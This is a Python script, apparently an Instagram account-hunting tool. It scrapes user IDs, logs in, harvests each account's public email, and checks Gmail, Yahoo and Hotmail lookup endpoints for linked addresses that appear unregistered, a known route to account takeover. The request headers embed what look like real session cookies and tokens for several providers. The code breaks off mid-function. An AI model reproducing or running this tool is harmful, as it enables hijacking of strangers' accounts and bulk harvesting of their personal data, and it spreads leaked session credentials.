import requests
from time import sleep
import os
import re
import time
url_insta='https://www.instagram.com/accounts/login/ajax/'
head_insta={
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
            'content-length': '277',
            'content-type': 'application/x-www-form-urlencoded',
           'cookie': 'ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'origin': 'https://www.instagram.com',
           'referer': 'https://www.instagram.com/accounts/login/',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
           'x-csrftoken': 'u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'x-ig-app-id': '936619743392459',
           'x-ig-www-claim': '0',
           'x-instagram-ajax': '7a3a3e64fa87',
           'x-requested-with': 'XMLHttpRequest'
        }
url_mail ='https://account.mail.ru/api/v1/user/exists'
url_yah00='https://login.yahoo.com/'
head_yahoo={
    
    'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
'Connection': 'keep-alive',
'Content-Length': '1467',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Cookie': 'APID=UPc3d3670d-4b5f-11eb-a7e1-02d1afc78ffe; B=bm51ibtfuk9f6&b=3&s=mg; GUC=AQEBAgFgJvVhAEIgRwSQ; A3=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8; A1=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8; A1S=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8&j=WORLD; AS=v=1&s=NBwjCaCi&d=A607373bd|hg8xhlz.2Soy1utLlBzQPIjImhcCaUAkk45UihFjnPp7zQL8CIH6F3rz7l5ObFHfZd8aOL.QFHoVN1GEe3s6wcWIdYmp0FgFL1qJQLpUWrDXfuAUTC2ypcLd01xJClYq8.8DHR3Yqne_wJKWryfPKJ37YCemKZh8LtagyT6.JHjtREEGzKFHIVSMSyAv8GTskIda1dizE9rJqI5h9CajKhT_1Fpv6Pm9WC6RpgthPsC.2PM97iWLj9FfmoRCwHE4qgrXihjdWX8WW9bWleWHAb3LIOC3iX6cgBKGPzWSsyR4dPyuKOfOEsUvXPxQyCqRBlRaWUvV1_5YYb7CSWnnOSRx_Y.1Oe7VgCnc__0umm6ifLgR2.b7LffvcxIC0Md9SZdt2T8Wg9By3fjf4cleOiJU2Es2M_0vKqmdlGM.JcRcnaQfgHGGngg.UzABVf6tEvNNTu8UkeQDGU.WCiEHPkQUvIGgJzfQ7HbhoOk3OrF9yg4uNm2ADzlQV_77BsWyJuNxwlr1c_THHQeMGWDRFcNJ4Ciz9.tR7qQZZdy3BHUMP3cBlHEqiNp8xKHMi0J2jQHsB.HcLNLFbtLpS.OgnnjixP5bUIPX9GctkS3MjgxQ_Q6.tZlvGh7TpnLsGlTIlcQx9JTgdavpaw92KMSWz7U389fbruS87jQtL5JS6pmXE3k8KgCzB8FKlKH5lDKMRO2VFyN0PxxY3aiD1QrWaGNbd1vNXYHknbhdU1TvlFx0X2zlbZeLNIPjRWLahuLItKGJt6CbTGbUkYlJeR9a_FyL4yOjA6H6GgxY8xxo5wnhodlT_HbUZTlyIqDdOkxecHWzm55QaaToyL8-~A|B6072260b|Y5LDaDz.2QKVGeVFq589P3G9PN64_9u.6wfeEeJvUX.zN313DrhJ0qOur8nHR5QzpiIy1Qf1I6yoFlbn5jRIgcFEoPOC9SgT1wZR28GDGqT9..qyna14.JxZlwjqf_bEz0ib5QUAPPTsr3Bl_UvqiiokWXlE3JLwxtPAE1dCQLL_jqYfNpF8slXWBRGjMoSyEL3oU6NOXC8WCW6BmDzQrNUPwbMyIebjeTqyDNxoC_0T82tdEd4MYZ8QcI2DcIsreEvGS6Wug.vlUmvo6geDH2ZcYwurfoQybTK7gOagvJZWhWOYh12JGVuy4BPBC46i52vWV0hMgvAzULRvW65jK3DKPXW98.KvtYkxNTF7I8xejYCVIAAsvNAOwKa6mPlsE5tBRnTGVK9sgxwGeLEgNdhlbx.hE.a6WZaL2EnAsDdISnNiuPQl0AyuH9Hw4L4dh05gk1NohocCM_zy5HHy0GFFsGCOHZonufsCKvdug_LwP_lTZBTxVmm6nlm4LqIbvn4PxrIcFlzmL6M2WjK1WJ.vuYQsVBfZmB9_znJfWR4Ep7nUeF8QPE35NWY9ne75QiDGRhoObS8PcHSx6BrioSgfZxYeJM3GF6zfUJqbRXsX3wfebkOqO5YhD1XvQ14fVkOo00XiaTP7v5qfnwGlihd_t_Ylvh.iZct7bVthrgBW7AsJOv6iaUXAso5uky9QIdhWJFRmYtNf9xeqfTkWrAMOGr16nfj_oUL9YY9m7EhRqUfYobko36dt9G2VjgpA1kekkm.S5vlKnQIuYUaMqWc5140zXB2Y8knSjVlXrzbwZkWPigK1OoiR8Tb_xo9Q_wGScZceA.6pkZM4kUJDHXX4GCVgmvu_ANJrHuK1PXu8Ou39Dm_uWA8YYjNQKNp82OsMIdk_IA62n6AapXm7VFpFZf3UBDQDNuelWJA.R5j46ojXAW7dEVntcT5OOINUx_806XRbmiH2UA8NTM08uiRZeWzvhCb0EwSxpuy_l_kMzS_bQ_fEjKmB8lTdHM3qkhQofdNaxYvcccWNBZPK4QXgzYj4jKuKJ535DcVea9fm.5CwRUiKquJtNMQfFd15ol2FUTWWnczHL81.gDr130rsBTPCOCiFpBGjZ6GsA6N0cOHs349Q5yFEBV77rZV3pwrCX0CyWhQNERhu47vBZyp0Wrs-~A|C6073740a|nWU1Nxr.2SrX2kl75xioXBtuwTkmF2eLWMrgmpw02kjvG8EQDJOdLd7XgENnn3JnokTt35CeoQlwwJm8ahViLR.KCwcpJzUZ1KT_4r0KpRh5ZuhkrRfizAa1H.dbsMxpnS3XWezcFL6jw7KEobx3uQLClKpZ8F6cAhtekjyq337uj9IKDzmqNYZ2mqVDNux1oA6ohByMNnxlsLZAGVths1rPel.cBnob8BlsnSN5OrgoY.d825sYaEfSgGL08YOTvPC3JmHc45iIQFVtmKqcQjCnT4ptMru2b1P0oWXsva.4GVzLor91dtGsgTC0MXBSNeLn5POHQ6PFFMvX5zTicHlUHWweIE_4wYQf2a8kOOB8IRyVqRrHnMp2EQHvTGXY0sZZsvgnAoXoUTYIF1ArTCBcJ0a.43lBujXWgJWy87FgADKqJX1WjpU_I2PtYUzu_YDYZ07QWzLOFh4EUDHOKmZ_8bcUj0AclaqPRjGVRH2m0c60.DpsuB3VqIYuJ9bsDxFLh44pRcFVR6jzwwdOdVJGM5KyfIk76rc_KdN2k51Vav77GEDXesMagNRHJUZ1L9TUso5IwB41_YU5O1oKMith6Imfm1GP0TDr65SPjmG1GCn7hrQ1mYvRVKOkUX5DJOazZ1TwOFGyG0ikWs6v1TNsfEfYHdoJSQJB23SyJGIEhoZZJIlLCpdrT8jJDo4BR8.pE.toLe.v12hAWSDK5eZlYyJOhHIK.TqfOHBvmIJB_dz7dnrUtjczuFN9f5W2fXsKyIlVgfVUeNbQ.RovpVWrhDM8DtpNGQMVkbFCU9FRYL8dLkUrAd0MiWLjXthWkz6Ox6kSmQcpQ7rM~A; APIDTS=1618092684',
'Host': 'login.yahoo.com',
'Origin': 'https://login.yahoo.com',
'Referer': 'https://login.yahoo.com/',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
'X-Requested-With': 'XMLHttpRequest'

}
head_mail= {

'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
'contenttype':'application/x-www-form-urlencoded; charset=UTF-8'


}

url_gmail='https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=32589&rt=j'
head_gmail ={
    'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '3911',
		'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		'cookie': 'OGPC=422038528-2:; SID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_cFdWBefOdFWBrRatzQzoTw.; __Secure-3PSID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_LWBgOEuV0LWH29_CLb3l1g.; HSID=A8KaTqMCOG6xpfvsz; SSID=AtYd81IgyZuE9EbfE; APISID=E3Psm5Uangi4fH9M/AkOnPYEUZWnD-tnA_; SAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; __Secure-3PAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; ACCOUNT_CHOOSER=AFx_qI6QfbFWoV6PV6XKN_T6BDu29QAEvMrEZsoAl1r4bDBfnWApbNKbPlRCbFUWBfZ_IufZlpgrXPJIQyLZtlrdzhTBLG1ugbS2CJ2q9HNMMkzfgeaXgctISpVwNdXddAWu4ZnL0x6TC4OCJGrmngsaE5GSmcovCQ; LSID=o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6lsMzh7eIoJ7jRz_OOQU1DQ.; SEARCH_SAMESITE=CgQImZIB; __Host-3PLSID=doritos|o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6ByLMNjL9oNzA97kBg7BANg.; 1P_JAR=2021-03-29-09; NID=212=i268DCPkYi3AzR0f25yIGeJwDvI9KnX0IkpB6-jLiMgIkylu-ok0FxsNwgb77pnNf9P1dRbBa0rwmwoo3rBZLPEqBaYbIUTYOqnGXlodQyFP6PiO7x1DARyLyIg2nH_J_J208rXWq1sLL7oP_YSeJFznofwfpsHamypEYMgwPx2rU9UJJ59txYOFOliHngVgrmyLeujCj_dKNV8hrTJDFTTVfnxZG68C; __Host-GAPS=1:BWYU84SbcmvuPTxMnLb_Bw1WhSze11euoEbasRquyke84p3z6kKhM4STn2l2KqDaXmLnjmuLAu5YjxpgPYYS2MAbFJoYEA:8QsfUKnQPG8GNFFh; SIDCC=AJi4QfGikn_BfUsmrNc_AQgbrwCzKzaBTYlqHvZ_vt7pRS98qOGuitJ1M1_khzvPELS_owtDIQ; __Secure-3PSIDCC=AJi4QfH3OD5jfNAacCFyT0_heunei0GLdQymhUmRU8zPB7R7Svse8_GiuWLuXbaSblXAYlq-7bU',
		'google-accounts-xsrf': '1',
		'origin': 'https://accounts.google.com',
		'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM&flowName=GlifWebSignIn&flowEntry=AddSession',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=eaa94017-90e6-4761-a779-143e63ce180a,sync_account_id=116486990055578668701,signin_mode=all_accounts,signout_mode=show_confirmation',
		'x-client-data': 'CJa2yQEIo7bJAQjEtskBCKmdygEIlqzKAQiIucoBCIbCygEI+MfKAQjx6soBCLGaywEI1JzLAQjjnMsBCKmdywEY4ZrLAQ==',
		'Decoded':
		'message ClientVariations {// Active client experiment variation IDs. repeated int32 variation_id = [3300118, 3300131, 3300164, 3313321, 3315222, 3316872, 3318022, 3318776, 3323249, 3329329, 3329620, 3329635, 3329705]; // Active client experiment variation IDs that trigger server-side behavior. repeated int32 trigger_variation_id = [3329377];}',
		'x-same-domain': '1'
}

url_hotmail='https://login.live.com/GetCredentialType.srf?opid=18B61A74C0399092&id=292841,292841&uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1610388946&rver=7.0.6737.0&wp=MBI_SSL&wreply=https://outlook.live.com/owa/?nlp=1&RpsCsrfState=12bddb84-565f-7363-7c1d-16ed24498974&aadredir=1&CBCXT=out&lw=1&fl=dob,flname,wld&cobrandid=90015&vv=1600&mkt=EN-US&lc=1033&uaid=9278610bfcef48f9820a8754696368a4'
head_hotmail = {
    "Accept":"application/json",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "en-US,en;q=0.5",
		"client-request-id": "9278610bfcef48f9820a8754696368a4",
        "Connection": "keep-alive",
		"Content-Length":"662",
		"Content-type": "application/json; charset=utf-8",
		"Cookie": "amsc=g5/vmVcC9/jl8KpePa/LjHGDan2Px052V897HKZn96Axn3bQBbKUCVYgD6MQ83S9uNrv4aqhX/2mXsvxhDHwVlnS1S4brsfbV/+q+46FYe8seevHfLCyKDOeSWFG3nhFVh8PudCNLlX1JE5Xr2oKE3Fv1LHWEwC0XaxJ09uZSf/9eLGCoMtxPzIVbBnVZtsOEyTAwpiISy38NQ1vt+rYobNwTZx7Tx7lD8fFo8+v0tvx/MhWCF5vWF329pPX7nP9RFKVYjNnuP42WYEx+c9bEN2ENm87nsIhq3UO9gICkDRydq+wC0EhTEA0yHsPrCgn:2:3c; logonLatency=LGN01=637459857469249127; uaid=9278610bfcef48f9820a8754696368a4; MSPRequ=id=292841&lt=1610389137&co=0; MSCC=62.201.240.231-IQ; OParams=11DSFTjNDjnsWswbCyrcHAzdSQyVUoqp5gHiNAToNR0oduzzT7UDkbZCda1nCWYE*a7YWyuxXv2yHelsTodJ9KPaYlTk4grz4OiRCKpjfjQ35xnV8Bl*0Kl2*USAC0O2UPcDdnqgZMm4nfBCzzb!e2DAAAVH5!cWgQ9KDjN16BtVERiiewRK6Km*3amYiOSUnrSXb1sFaFVroIz1CLuBiPyfCweip6MCdT!wTh1ljimeYukrtyCEzQxUupDBo6ihsu3e8fZnpa6seOzy8k2cB1XCXMwBBFyacEQa1AsvueIkRRzJ72tC86d7ZkqkMh7Iwdp2MAj9cMTnjFyroavRFbjUlyiQUpkcj!GkmeeCVK*f!gIOJ5FxT7ZD40O34yKBw7dlXedLHlAhktq0fWWCLZhuXrq3rtQCQafk7ra*BpWJgAC8t6B!5!09EmPO8lwSdobhtk!FB3rYwPtFmnSrBWwtWSlAJYnZVpNHNu6CvyA7phAAH3ZU64uDhG92zcGrTSw7Jrw948plEhXznzbUWVLolM0ik2W8LvjIIISYrB*1c1AgIr2TAJ2CgnKh6hkYDZX8WHAlV0V39oRTP2*0BquEkFJgdBFAmvvUT3*VbDoGfq969jLhAR5hzs07cP8KuXKeICg**rtwbh9NmNBtoEKNUJ5c!JlCTEyFHb14Q3TAOFCwjvyQZ!K5sEYXZMsqvSMgqprjyMOkXk85z05yxUrBi5zmv*0BiWcXWRrFMBmoiSFgGE*5HkUmQHFLcf95OckHGP2fjM2sTyz5*QMETKd6!uTX8grFDnPGXJ4FA5PeJXsLhhKODr2Ld6J93RZuzkbqWiJvOLQG4RH4BTpyAB*Dr0ZART7phz39T!MXWqWHM5R*mP8c1JFOGKw5luM51hFaCiMPkleOGTEjkzp7QnKjFE!ynIxVdz!YvpwohE*t6hUttMBIfPXta3VW3dw4Eqj4nNELwMEyD*!hifeq3VSOgJjPpjde3n299z5iW47NKX4CKMIBHA4nihDbnJ!OHvELkXp!n6TVDeUnmqol3wKytMoCbPyo2oeAW89*Auh9CtlXKphgkk78aLsIkHBjwu4zh7*e0Xoyvg8k0XiyOwRjOlGG7xoh9LlLX783wFlToQoHXyHrMiR4OBJamorY2WLMDnVI1EqCDjYvpjVyAyk2UQWH9XFSoTUtIJZzZX*P2zmx*IfnXXKeWGJowbVPTTeCr*oxGjXAzndmEBw*qGqYucDg83WCoAUzTvPnDiU8n9n04X16adTgGxGGcc90BDQQ*4pmhN5gi4JgAgs852OQksIDBK15G4EvF4h82TKwweipAcnt5cjsICZ1quxpuHWbXvYmBC!sw9!h3aIlhA1CRcMcYur*j4ztkq0nyGQJettl1K!6!AjRWJfHSF2R*AIAaCcdM4bOi2ZOCa7wcsrEQ$; MSPOK=$uuid-f37b8adb-9c80-44ea-a285-8dd85b250107$uuid-cd7f0f55-8401-4a11-a686-09ad382c8b9a$uuid-7d5b4409-fed6-4857-8739-b8d809ec1025$uuid-e9cac0fb-5c3f-4d5c-8533-e7a91722f708$uuid-b66344ec-9e8d-4cf1-ab1f-27bbc99b8954$uuid-14f69474-9bcb-4a7a-893e-16c013b37277",
		"Host": "login.live.com",
		"hpgact": "0",
		"hpgid": "33",
		"Origin": "https://login.live.com",
		"Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1610388946&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d12bddb84-565f-7363-7c1d-16ed24498974&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
		"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
}


def userone():
    head = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }
    fff = open("id.txt","w")
    os.system("clear")
    print("TYPE USERNAME ")
    print("\n------------------")
    x = input("username :")
    url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+x+"&count=500"
    get = requests.get(url,headers=head)
    g = re.compile(r'"pk":"(.*?)"')
    gs = g.findall(get.text)
    for x in gs:
        fff.write(x+"\n")

def usernamee():
    head = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }
    filer = open("id.txt","w")
    cvv = []
    os.system("cls")
    print("Press CTRL + C THEN ENTER TO STROP ADD KEYWORD")
    print("-----------------------------------")
    while True:
        
        try:
            user = input("username :")
            cvv.append(user)
        except:
            break
    for x in cvv:
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+x+"&count=500"
        get = requests.get(url,headers=head)
        g = re.compile(r'"pk":"(.*?)"')
        gs = g.findall(get.text)
        for x in gs:
            filer.write(x+"\n")



        
def cheker():
    os.system("clear")
    count = 0
    notcount = 0
    logg = open('login.txt','r').readlines()
    logg2 = open('login2.txt' , 'r').readlines()
    for chawm in logg:
        kora = chawm.strip()
    for chawm2 in logg2:
        kora2 = chawm2.strip()
    username =kora
    password = kora2
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '274',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; rur=VLL; csrftoken=Iwq1hnXNJ3Y8IH1fRYDND6r72Zezq28I',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'x-csrftoken': 'Iwq1hnXNJ3Y8IH1fRYDND6r72Zezq28I',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9J8a',
    'x-instagram-ajax': '1cb44f68ffec',
    'x-requested-with': 'XMLHttpRequest'
    }
    data = {
    'username': username,
    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613212725:'+password,
    'queryParams': '{}',
    'optIntoOneTap': 'false'
    }
    r = requests.session()
    req_login = requests.post(url, data=data, headers=headers)
    if '"authenticated":true' in req_login.text:
        print(req_login.cookies)
        print('\033[1;32m[+] Login Successfully  ..')
    else:
        print('\033[0;31m[+] Faild Login\x1b[0m')
        exit()
    headrs = {'user-agent':'Instagram 9.7.0 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-N920P; nobleltespr; samsungexynos7420; ar_IQ)'}
    xxx = open("id.txt",'r').readlines()
    os.system("clear")
    print("--------- TOOL HUNTER V2--------")
    print("MY INSTAGRAM :Danyar.software")
    print("MY TELGRAM :Danyarsoftware")
    print("\nSTARTED PLEAS WAIT ..")
    print("======================================")
    for x in xxx:
        
        u = x.strip()
        time.sleep(4)
        url = "https://i.instagram.com/api/v1/users/" + u + "/info/"
        get = r.get(url, headers=headrs, cookies=req_login.cookies)
    
        ani = re.compile(r'"username":"(.*?)"')
        hama = re.compile(r'"public_email":"(.*?)"')
        baha = re.compile(r'"follower_count":(.*?),')
        lord = re.compile(r'"following_count":(.*?),')
        lordd = lord.findall(get.text)
        lora = re.compile(r'"is_verified":(.*?),')
        loraa = lora.findall(get.text)
        anii = ani.findall(get.text)
        hamaa=hama.findall(get.text)
        bahaa = baha.findall(get.text)
        for xd in hamaa:
            print(xd)

            
            if '@gmail.com' in xd:
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day = requests.post(url_insta,headers=head_insta,data=data_insta).text

                if '"message":"There was an error with your request. Please try again."' in day:
                    global head_gmail
                    data_gmail = {
		'continue': 'https://adssettings.google.com/authenticated?ref=yt_auth&pli=1',
		'f.req': f'["{xd}","AEThLlw6VGsyn2_pe-f86vgMSUv6HW6cl7s3ftZAG2KM59m7HtlMteSbiMd1cXodMV9ao2r-etLvEFwNOT1gmDeaWFo3pqVs2c8soJREt0Nt6O_RSxudYIUsivz-edV1f8qX-zBOsY7YMWaow-mczgAPFsOkLBibmlmgwm2DK_Mq4qKUpR1tG4YpAzApopzlBEgFAymMMus8",[],null,"US",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{xd}",null,null,null,true,true,[]]',
		'bgRequest': '["identifier","!XV6lXhPNAAY7smA8O7JCzxWNYzZtiS87ACkAIwj8RuOTLVLxGJigVpDhaC2z7ynSG4_C6vg2kxXAWOp26z7eH2IZogIAAAB9UgAAAB5oAQeZBBMPBNZpIQ75l0BgkmrzBFCvhfOdp8Lin14ikTnA1WsoaIfdlfYG6MYQnjc1UrPRJa74ZxDpu1BFftPI0nN7EOnM4ZS18dsZejZRwZBLtKG8QP0Q-GJEOZbq2-r2fqHe3GZb5Z7NW4rUeCLKfwsV7Tb8fuzfYlpZ_40Mw5S4Gk1C7BL4MOhtd3GE_62Qp-RuqLoqIvv5XIqMbLq6v0PjY6cUg5wg3cN4n3dF26kVWJYtS8vpVd5kBtydVCgidSNhN4ARi9Lk5TocNbPYonI5sm-7sJ0UGHI7wT4OFXJeKK_FgVxjXWI2FpFSrEPhgZahdfMB94LMNK-8eMIJKLTR-eOtu6l6TB3KVZEthoN_M0pvQHPcfAhLb0EB5tfkrcdZiMhOCGIZuCBmjzkog2_DV0Mw8Im5hMuTm8qrmX7i-lzWEmuuuYW5FGKDUraHZ0A0EmvWRaw7uMII2ScdpcXWUI6JGEjZYgGmOoTgMWVmUU0HTKuwLYkJvYxV89EdOjdtEjqfnlEl9WC21RfSxIt3mMkr9orJdP4opSk6neVuFTvvRD53NZ9iNboauX0Epe0IFa6NvidBSHLXIiaC92VUeNE08EaGEMXcy45ffg2BYsxmyu4DWRIoPcr0t1IrWdhwc1srOguxWl0mBs6QYeyLBc4CNRVglRFm3nklWlIE31g8GahYNLQnAxeljgp_WKEXda5VQm6WkDGcYGPbRf3bfxYqbJircIPhcOEYXzk8BQ9gJq9i3t3zX3qFg9U9B3skBRK4JgGKwzVWGjrw6K5G9uIOFsmXdPq7pdQE_tQ-PMPkuUPNoIZb98lu6reUbBEDHWfnpaiY6tjtTg0fcQW0kzrUN5kwJz7L47KpDYij4K3Y-hWN4vXJAFrbAHazlYZ4THHYrQDxeITF0MP6vweiyoful6H_YArrwliPX_7kswLE1MYOR_i5KwYlJEi9dMz1nSzyRynLSthBsez-zQYhlbt5Xhi8NuL3dRMxM8zRj2yw71sYdKjsX_AvNz0JX0v6W6eQSv6pVwyNAscdFsBcNt2N3xvwy0YUiFwIud5ypZe_MeWd8aByk4cce21tpZN8FDa4j6b2CGXPVpaVC7IZjCh0h_cXfFPoNONzD9roDpmOKzCrTj_q6xNPhtwY8vWdTV0CaJJbcm_ra3rp3FF0x6Hws5KZl9KpeRanphhtuiT90e-49V2AYdmbdlXgtZqJBswKwOOZhYUcw_33Q8t27ZXtiKxW2ieUv3fwvJ9Dz8l9pttsavtYUZ_mX6mN-PU4orT89JgeUDqimD91YI6Yx7KyoYlRbe7hYWNMzo0RAuuoElDr6GyTgf7pZC67XYQKm3-J3Obuja9iac7IeN7KaScI7uGcFV9gNhvP8j6evm9zws5Dlw"]',
		'at': 'AFoagUW_q8bXR45ZgAOS4A5fq9dVpQpMBQ:1617008567951',
		'azt': 'AFoagUW9q50Z3AnyfPsppwG7DjGdRvSUMQ:1617008567952',
		'cookiesDisabled': 'false',
		'deviceinfo': '[null,null,null,[],null,"US",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,2,null,false]',
		'gmscoreversion': 'undefined',
		'checkConnection': 'youtube:142:0',
		'checkedDomains': 'youtube',
		'pstMsg': '1'
                    }
                    global url_gmail
                    novemer = requests.post(url=url_gmail,headers=head_gmail,data=data_gmail)
                    if '["e",3,null,null,439]' in novemer.text:
                        for lafa in anii:
                            for lafa2 in bahaa:
                                for lafa3 in lordd:
                                    for lafa4 in loraa:
                                        print('username :'+lafa)
                                        print('Followers :'+lafa2)
                                        print('Following :'+lafa3)
                                        print('Email :'+xd)
                                        print('Isverified :'+lafa4)
                    elif '["e",3,null,null,417]' in novemer.text:
                        for lafa11 in anii:
                            for lafa22 in bahaa:
                                for lafa33 in lordd:
                                    for lafa44 in loraa:
                                        print('username :'+lafa11)
                                        print('Followers :'+lafa22)
                                        print('Following :'+lafa33)
                                        print('Email :'+xd)
                                        print('Isverified :'+lafa44)
                    

            if '@yahoo.com' in xd:
            
                global head_yahoo
                global url_yah00
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
